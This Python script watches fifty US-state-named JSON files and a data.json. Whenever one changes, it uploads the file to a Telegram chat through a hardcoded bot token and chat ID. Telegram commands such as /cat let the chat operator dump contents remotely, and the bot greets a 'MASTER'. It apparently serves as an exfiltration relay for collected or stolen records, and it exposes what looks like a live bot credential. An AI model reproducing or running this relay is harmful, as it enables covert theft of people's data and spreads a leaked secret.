import os
import time
import requests
import threading
import logging
import mmap
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# ================================
# CONFIGURATION
# ================================
BOT_TOKEN = "7654075865:AAEyXHMn6VC56z1d9FzH94Q-IsPc9Wpk3tY"
CHAT_ID = "5235497034"

SEND_MESSAGE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
SEND_FILE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
GET_UPDATES_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"

FILES_TO_WATCH = [
    "AL.json", "AK.json", "AZ.json", "AR.json", "CA.json", "CO.json", "CT.json", "DE.json",
    "FL.json", "GA.json", "HI.json", "ID.json", "IL.json", "IN.json", "IA.json", "KS.json",
    "KY.json", "LA.json", "ME.json", "MD.json", "MA.json", "MI.json", "MN.json", "MS.json",
    "MO.json", "MT.json", "NE.json", "NV.json", "NH.json", "NJ.json", "NM.json", "NY.json",
    "NC.json", "ND.json", "OH.json", "OK.json", "OR.json", "PA.json", "RI.json", "SC.json",
    "SD.json", "TN.json", "TX.json", "UT.json", "VT.json", "VA.json", "WA.json", "WV.json",
    "WI.json", "WY.json", "data.json"
]
FILES_TO_WATCH = [os.path.abspath(f) for f in FILES_TO_WATCH]

# Ensure directories exist
for file in FILES_TO_WATCH:
    os.makedirs(os.path.dirname(file), exist_ok=True)

# ================================
# FILE STATE TRACKING
# ================================
file_data = {
    file: {
        "size": os.path.getsize(file) if os.path.exists(file) else 0,
        "created": time.ctime(os.path.getctime(file)) if os.path.exists(file) else "Not Found",
        "mtime": os.path.getmtime(file) if os.path.exists(file) else 0
    } for file in FILES_TO_WATCH
}

# ================================
# LOGGING
# ================================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

# ================================
# TELEGRAM MESSAGE FUNCTIONS
# ================================
def send_message(text):
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        response = requests.post(SEND_MESSAGE_URL, data=payload)
        response.raise_for_status()
        logging.info(f"Message sent: {text}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending message: {e}")

def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                SEND_FILE_URL, data={"chat_id": CHAT_ID}, files={"document": file}
            )
            response.raise_for_status()
            logging.info(f"File '{file_path}' sent successfully!")
    except Exception as e:
        logging.error(f"Error sending file '{file_path}': {e}")
        send_file_content(file_path)

def send_file_content(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            with mmap.mmap(file.fileno(), 0, access=mmap.ACCESS_READ) as mmapped_file:
                content = mmapped_file.read(4000).decode('utf-8', errors='ignore')
                send_message(f"📄 *{os.path.basename(file_path)} Content:*\n```\n{content}\n```")
    except Exception as e:
        send_message(f"Error reading file '{file_path}': {e}")

# ================================
# FILE MONITORING
# ================================
class FileEventHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            self.process(event.src_path, created=True)

    def on_modified(self, event):
        if not event.is_directory:
            self.process(event.src_path)

    def process(self, file_path, created=False):
        abs_path = os.path.abspath(file_path)
        if abs_path in FILES_TO_WATCH:
            try:
                new_size = os.path.getsize(abs_path)
                new_mtime = os.path.getmtime(abs_path)

                prev_size = file_data[abs_path]["size"]
                prev_mtime = file_data[abs_path]["mtime"]

                if created or new_size != prev_size or new_mtime != prev_mtime:
                    file_data[abs_path]["size"] = new_size
                    file_data[abs_path]["mtime"] = new_mtime
                    file_data[abs_path]["created"] = time.ctime(os.path.getctime(abs_path))

                    send_message(f"✅ STATUS: FILE UPDATED: {os.path.basename(abs_path)} || {new_size} bytes")
                    time.sleep(1)
                    send_file(abs_path)

            except Exception as e:
                logging.error(f"Error processing file '{abs_path}': {e}")

# ================================
# COMMAND HANDLER
# ================================
def handle_commands():
    last_update_id = None
    while True:
        try:
            response = requests.get(GET_UPDATES_URL, params={"offset": last_update_id})
            response.raise_for_status()
            data = response.json()

            if "result" in data:
                for update in data["result"]:
                    last_update_id = update["update_id"] + 1
                    if "message" in update:
                        text = update["message"].get("text", "").strip().lower()
                        if text == "/start":
                            send_message("👋 HELLO MASTER, HOW YOU’RE???\n🚀🔥 LET'S FIND THE SHIT OUT OF THE WORLD!")
                        elif text == "/update":
                            send_message("🔄 Checking for file updates...")
                            check_files()
                        elif text == "/size":
                            send_sizes()
                        elif text == "/filz":
                            send_created_files()
                        elif text == "/cat":
                            send_all_file_contents()
        except Exception as e:
            logging.error(f"Error in command handler: {e}")
        time.sleep(5)

# ================================
# MANUAL FILE CHECKING
# ================================
def check_files():
    for file_path in FILES_TO_WATCH:
        if os.path.exists(file_path):
            try:
                new_size = os.path.getsize(file_path)
                new_mtime = os.path.getmtime(file_path)

                if new_size != file_data[file_path]["size"] or new_mtime != file_data[file_path]["mtime"]:
                    file_data[file_path]["size"] = new_size
                    file_data[file_path]["mtime"] = new_mtime
                    send_message(f"✅ STATUS : FILE UPDATED : {os.path.basename(file_path)} || {new_size} bytes")
                    send_file(file_path)
            except Exception as e:
                logging.error(f"Error in manual check: {e}")

def send_sizes():
    sizes = [f"{os.path.basename(f)} || {file_data[f]['size']} bytes" for f in FILES_TO_WATCH if os.path.exists(f)]
    send_message("📂 File Sizes:\n" + "\n".join(sizes) if sizes else "⚠ No tracked files found.")

def send_created_files():
    created_files = [f"{os.path.basename(f)} || {file_data[f]['created']}" for f in FILES_TO_WATCH if os.path.exists(f)]
    send_message("📁 Tracked Files Created:\n" + "\n".join(created_files) if created_files else "⚠ No files created yet.")

def send_all_file_contents():
    for file_path in FILES_TO_WATCH:
        if os.path.exists(file_path):
            send_file_content(file_path)

# ================================
# MAIN ENTRY POINT
# ================================
if __name__ == "__main__":
    send_message("👋 HELLO MASTER, HOW YOU’RE???\n🚀🔥 THE SERVER IS RUNNING WELL")
    event_handler = FileEventHandler()
    observer = Observer()

    monitored_dirs = {os.path.dirname(f) for f in FILES_TO_WATCH}
    for directory in monitored_dirs:
        observer.schedule(event_handler, directory, recursive=False)

    observer.start()
    threading.Thread(target=handle_commands, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()
